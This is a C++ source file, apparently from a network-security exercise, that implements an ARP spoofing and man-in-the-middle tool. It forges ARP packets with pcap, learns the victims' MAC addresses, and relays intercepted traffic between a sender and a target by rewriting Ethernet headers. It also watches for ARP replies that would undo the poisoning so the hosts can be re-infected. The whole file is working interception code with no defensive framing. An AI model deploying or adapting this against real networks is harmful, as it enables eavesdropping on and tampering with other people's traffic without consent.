#include "spoof.h"


void Spoof::GetAttackerMac(const char* interface) {
    unsigned char AttackerMac[6];
    struct ifreq ifr;
    int sock = socket(AF_INET, SOCK_DGRAM, 0);
    
    strcpy(ifr.ifr_name, interface);
    ioctl(sock, SIOCGIFHWADDR, &ifr);
    memcpy(AttackerMac, ifr.ifr_hwaddr.sa_data, 6);
    
    close(sock);
    attackerMac_ = Mac(AttackerMac);
}

void Spoof::GetAttackerIP(const char* interface) {
    static char ip[16];
    struct ifreq ifr;
    int sock = socket(AF_INET, SOCK_DGRAM, 0);
    
    strcpy(ifr.ifr_name, interface);
    ioctl(sock, SIOCGIFADDR, &ifr);
    
    struct sockaddr_in* addr = (struct sockaddr_in*)&ifr.ifr_addr;
    strcpy(ip, inet_ntoa(addr->sin_addr));
    
    close(sock);
    attackerIP_ = Ip(ip);
}

void Spoof::SetDefaultArpPacket(struct EthArpPacket& packet) {
    packet.eth_.type_ = htons(EthHdr::Arp);
    packet.arp_.hrd_ = htons(ArpHdr::ETHER);
    packet.arp_.pro_ = htons(EthHdr::Ip4);
    packet.arp_.hln_ = Mac::SIZE;
    packet.arp_.pln_ = Ip::SIZE;
}

void Spoof::SetPacket(struct EthArpPacket &packet, Mac dmac, Mac smac, uint16_t op, Ip sip, Mac tmac, Ip tip){
	packet.eth_.dmac_ = dmac;
	packet.eth_.smac_ = smac;
	packet.arp_.op_ = htons(op);
	packet.arp_.smac_ = smac;
    packet.arp_.sip_ = htonl(sip);
    packet.arp_.tmac_ = tmac;
    packet.arp_.tip_ = htonl(tip);
}

void Spoof::SendArpPacket(pcap_t* pcap,  const EthArpPacket* packet) {
    const u_char* p = reinterpret_cast<const u_char*>(packet);
	int res = pcap_sendpacket(pcap, p, sizeof(EthArpPacket));
	if (res != 0) {
		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(pcap));
		exit(PCAP_ERROR);
	}
}

void Spoof::GetSrcMac(pcap_t* pcap, std::string SendORTarget) {
    struct pcap_pkthdr* header;
    const u_char* packet;
    struct EthArpPacket *etharp;
    int cnt = 0;

    do {
        pcap_next_ex(pcap, &header, &packet);
        etharp = (struct EthArpPacket *)packet;
        cnt++;
        if (cnt == 10) {
            printf("Not Found Arp Packet");
            exit(-1); //TODO error define 
        }
    } while (htons(etharp->eth_.type_) != EthHdr::Arp);

    if(SendORTarget == "Sender") {
        senderMac_ = etharp->arp_.smac();
    }
    else if (SendORTarget == "Target") {
        targetMac_ = etharp->arp_.smac();
    }
    else {
        printf("Wrong ");
        exit(-1); //TODO Error Define
    }

}

void Spoof::SetSendnTargetIp(char* senderIP, char* targetIP){
    senderIP_ = Ip(senderIP);
    targetIP_ = Ip(targetIP);
}

int Spoof::RelayPacket(pcap_t* pcap) {
    struct pcap_pkthdr* header;
    const u_char* packet;
    int result = 0;
    bool isArp = false;
        
    int res = pcap_next_ex(pcap, &header, &packet);

    u_char* cpPacket = (u_char*)malloc(header->len);
    memcpy(cpPacket, packet, header->len);

    struct EthHdr *eth = (struct EthHdr *)cpPacket;
    int ethLength = sizeof(EthHdr);

    Ip sip;
    Ip tip;

    switch (ntohs(eth->type_)) {
        case EthHdr::Ip4: {
            struct IpHdr *ip = (struct IpHdr *) (cpPacket + ethLength);
            sip = ntohl(Ip(ip->Sip));
            tip = ntohl(Ip(ip->Dip));
            break;
        }
            
        case EthHdr::Arp: {
            struct ArpHdr *arp = (struct ArpHdr *) (cpPacket + ethLength);
            sip = ntohl(Ip(arp->sip()));
            tip = ntohl(Ip(arp->tip()));
            isArp= true;
            break;
        }
            
        case EthHdr::Ip6:
            //TODO
        break;
    
        default:
            printf("Wrong Packet");
            exit(-1); //TODO Error Define
            break;
    };

    if (sip == senderIP_ && tip == targetIP_) { //게이트웨이라면? -> 이 부분 처리해야 함
        eth->dmac_ = targetMac_;
        eth->smac_ = attackerMac_;
        pcap_sendpacket(pcap, cpPacket, header->len);
    }
    else if (sip == targetIP_ && tip == senderIP_) {
        eth->dmac_ = senderMac_;
        eth->smac_ = attackerMac_;
        pcap_sendpacket(pcap, cpPacket, header->len);
    }
    else if (isArp && (eth->smac_ == senderMac_) && (eth->dmac_ == attackerMac_) ) {
        //reinfection
        result = 1;
    }
    else if (isArp && (eth->smac_ == targetMac_) && (eth->dmac_ == attackerMac_) ) {
        //reinfection
        result = 1;
    }

    free(cpPacket);
    return result;
}
